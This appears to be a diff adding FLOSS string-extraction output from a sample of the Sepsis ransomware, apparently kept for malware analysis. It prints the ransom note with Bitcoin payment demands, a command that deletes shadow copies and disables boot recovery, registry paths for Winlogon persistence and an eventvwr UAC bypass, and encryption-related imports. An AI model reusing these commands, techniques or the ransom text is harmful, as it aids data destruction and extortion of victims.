@@ -1,0 +1,393 @@
+FLOSS static ASCII strings
+!This program cannot be run in DOS mode.
+RichO
+.text
+`.rdata
+@.data
+.reloc
+SVWj
+abcd
+efgh
+ijkl
+mnop
+qrst
+uvwxf
+ABCD
+EFGH
+IJKL
+MNOP
+QRST
+UVWXf
+!@#$
+%^&*
+()-=
++.,:f
+u	^[
+5P0@
+h86@
+5@0@
+h@6@
+D$@P
+hH6@
+D$@P
+hL6@
+D$@P
+h\6@
+D$@P
+hp6@
+D$@P
+D$@P
+D$@P
+D$@P
+D$@P
+D$@P
+h(7@
+D$@P
+hT7@
+D$@P
+hl7@
+D$@P
+D$@P
+D$@P
+D$<PS
+D$<P
+h86@
+5@0@
+h@6@
+D$@P
+hH6@
+D$@P
+hL6@
+D$@P
+h\6@
+D$@P
+hp6@
+D$@P
+D$@P
+D$@P
+D$@P
+D$@P
+D$@P
+h(7@
+D$@P
+hT7@
+D$@P
+hl7@
+D$@P
+D$@P
+D$@P
+D$@P
+D$@P
+D$<PS
+D$<P
+h@f@
+h@f@
+h@f@
+h P@
+h@f@
+h d@
+h d@
+h d@
+h,f@
+hH5@
+5,f@
+5,f@
+h d@
+h d@
+h d@
+h d@
+h d@
+h d@
+h,f@
+hH5@
+5,f@
+5,f@
+h d@
+Vh d@
+h d@
+VVVh d@
+VVVh d@
+hP9@
+hP9@
+h@9@
+t/f9
+tTh(f@
+h(f@
+c|w{
+9JLX
+~=d]
+lpHP
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/h3@
+-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDgrfmmBw99c6k47 / OBto0QuJnIFNLJyqocECDo7SCCTpZ1RbCx5iTwuZN2DqaI2z69bsRWKprUBSLjSQYEPs / 3qEpQV8qKZl9JdlSbA5qxTgHmQkMMKLdy0w0O4BDi1D6XhOFJOXLl3uA481oEMD + rM0p8qxBBPY32KtaQoQuahQIDAQAB-----END PUBLIC KEY-----
+ntdll.dll
+RtlSetProcessIsCritical
+NtSetInformationProcess
+HJG><JkFWYIguiohgt89573gujhuy78^*(&(^&^$
+GCTL
+.text$mn
+.idata$5
+.rdata
+.rdata$zzzdbg
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data
+.bss
+CryptDecodeObjectEx
+CryptStringToBinaryA
+CryptImportPublicKeyInfo
+CRYPT32.dll
+PathCombineW
+PathFindExtensionW
+SHLWAPI.dll
+realloc
+malloc
+srand
+fclose
+fseek
+rand
+fwrite
+_wfopen
+free
+MSVCRT.dll
+GetFileSizeEx
+CreateFileW
+UnmapViewOfFile
+CloseHandle
+GetFileSize
+CreateFileMappingW
+MapViewOfFile
+MoveFileW
+LocalFree
+FindFirstFileW
+FindNextFileW
+GetCurrentProcess
+GetModuleFileNameW
+WaitForMultipleObjects
+GetTempPathW
+CreateMutexW
+FindClose
+ReleaseMutex
+Wow64EnableWow64FsRedirection
+SetFileAttributesW
+GetLogicalDriveStringsW
+Sleep
+LoadLibraryA
+DeleteFileW
+CreateThread
+GetWindowsDirectoryW
+GetProcAddress
+ExitProcess
+CopyFileW
+OpenMutexW
+lstrcmpW
+KERNEL32.dll
+CryptEncrypt
+CryptAcquireContextW
+GetTokenInformation
+RegOpenKeyW
+RegCreateKeyW
+RegOpenKeyExW
+OpenProcessToken
+RegSetValueExW
+RegCloseKey
+AdjustTokenPrivileges
+LookupPrivilegeValueW
+ADVAPI32.dll
+ShellExecuteW
+SHGetSpecialFolderLocation
+SHGetPathFromIDListW
+SHELL32.dll
+memcpy
+memset
+<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'>
+<!body text="red">
+<html>
+  <head>
+    <meta charset='windows-1251'>
+    <title>Sepsis@protonmail.com</title>
+    <HTA:APPLICATION
+      ICON='msiexec.exe'
+      SINGLEINSTANCE='yes'
+      SysMenu="no">
+    <script language='JScript'>
+      window.moveTo(50, 50);
+      window.resizeTo(screen.width - 100, screen.height - 100);
+    </script>
+    <style type='text/css'>
+      body {
+        font: 15px Tahoma, sans-serif;
+        margin: 10px;
+        line-height: 25px;
+        background: #808080;
+      }
+      .bold {
+        font-weight: bold;
+      }
+      .mark {
+        background: #FF0000;
+        padding: 2px 5px;
+      }
+	  img {
+		display:block;
+		margin:auto;
+	  }
+      .header {
+		text-align: center;
+        font-size: 30px;
+        line-height: 50px;
+        font-weight: bold;
+		margin-bottom:20px;
+      }
+      .info {
+        background: #ffff00;
+        border-left: 10px solid #00008B;
+      }
+      .alert {
+        background: #ffff00;
+        border-left: 10px solid #FF0000;
+      }
+      .private {
+        border: 1px dashed #000;
+        background: #FFFFEF;
+      }
+      .note {
+        height: auto;
+        padding-bottom: 1px;
+        margin: 15px 0;
+      }
+      .note .title {
+        font-weight: bold;
+        text-indent: 10px;
+        height: 30px;
+        line-height: 30px;
+        padding-top: 10px;
+      }
+      .note .mark {
+        background: #A2A2B5;
+      }
+      .note ul {
+        margin-top: 0;
+      }
+      .note pre {
+        margin-left: 15px;
+        line-height: 13px;
+        font-size: 13px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class='header'>
+	<div style='color:yellow'>Welcome to Sepsis Ransomware!</div>
+		<div style='color:blue'>All your files have been encrypted!</div>
+	</div>
+    <div class='bold'>All your files have been encrypted due to a security problem with your PC. If you want to restore them, write us to the e-mail <span class='mark'>Sepsis@protonmail.com</span></div>	 <div class='bold'>Write this ID in the title of your message <span class='mark'>16E734E0</span></div>
+	 <div class='bold'>In case of no answer in 24 hours write us to theese e-mails:<span class='mark'>sepsis@airmail.cc</span></div>
+    <div>
+		The price depends on how fast you write to us. You have to pay for decryption in Bitcoins. After payment we will send you the decryption tool that will decrypt all your files.
+	</div>
+	<div class='note info'>
+      <div class='title'>Free decryption as guarantee</div>
+		<ul>Before paying you can send us up to 5 files for free decryption. The total size of files must be less than 10Mb (non archived), and files should not contain valuable information. (databases,backups, large excel sheets, etc.)	    </ul>
+    </div>
+    <div class='note info'>
+      <div class='title'>How to obtain Bitcoins</div>
+      <ul>
+        The easiest way to buy bitcoins is LocalBitcoins site. You have to register, click 'Buy bitcoins', and select the seller by payment method and price. 
+          <br><a href='https://localbitcoins.com/buy_bitcoins'>https://localbitcoins.com/buy_bitcoins</a>
+		  <br> Also you can find other places to buy Bitcoins and beginners guide here:
+          <br><a href='http://www.coindesk.com/information/how-can-i-buy-bitcoins/'>http://www.coindesk.com/information/how-can-i-buy-bitcoins/</a>
+      </ul>
+    </div>
+    <div class='note alert'>
+      <div class='title'>Attention!</div>
+      <ul>
+        <li>Do not rename encrypted files.</li>
+        <li>Do not try to decrypt your data using third party software, it may cause permanent data loss.</li>
+        <li>Decryption of your files with the help of third parties may cause increased price (they add their fee to our) or you can become a victim of a scam.</li>
+      </ul>
+    </div>
+  </body>
+</html>
+0 0%0,01080=0D0I0P0U0\0a0h0m0t0y0
+1#1l1
+3^4v4
+4;5Q5w5
+7*7G7f7m7
+8Y8^8g8t8{8
+889B9G9N9v9{9
+:%:9:M:a:u:
+;%;c;
+<%<1<E<Y<m<
+=!=5=I=]=m=
+>2>>>E>J>_>g>p>y>
+? ?5?G?Q?X?c?
+101D1N1V1d1n1z1
+2$2*2/2;2F2L2V2_2e2m2s2x2~2
+343;3n3v3{3
+4,424@4E4P4[4d4o4y4
+5>5R5\5i5n5
+61696C6a6g6v6}6
+`3d3
+
+FLOSS static UTF-16 strings
+@.[Sepsis@protonmail.com].SEPSIS
+SeDebugPrivilege
+s\explorer.exe, 
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+Shell
+Software\Classes\mscfile\shell\open\command
+eventvwr.exe
+Windows
+MSOCache
+PerfLogs
+DVD Maker
+Internet Explorer
+Reference Assemblies
+Windows Defender
+Windows Mail
+Windows Media Player
+Windows NT
+Windows Sidebar
+Startup
+Temp
+Program Files
+Program Files (x86)
+\Info.hta
+ /c vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled no & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+cmd.exe
+\svchost.exe
+
+
+FLOSS decoded 23 strings
+bcccbcccbcccbccc
+4Pil
+LfIA
+bcccbcccbcccbccc
+4Pil
+LfIA
+bcccbcccbcccbccc
+4Pil
+LfIA
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+abcdefghijklmnopqrstuvwxyz
+!@#$%^&*()-=+.,:;?
+!!!!
+!!!!!
+!!!!!!
+!!!!!!!
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+abcdefghijklmnopqrstuvwxyz
+!@#$%^&*()-=+.,:;?
+!!!!
+!!!!!
+!!!!!!
+!!!!!!!
+
+FLOSS extracted 3 stackstrings
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+!@#$%^&*()-=+.,:;?
+
+Finished execution after 1.484000 seconds
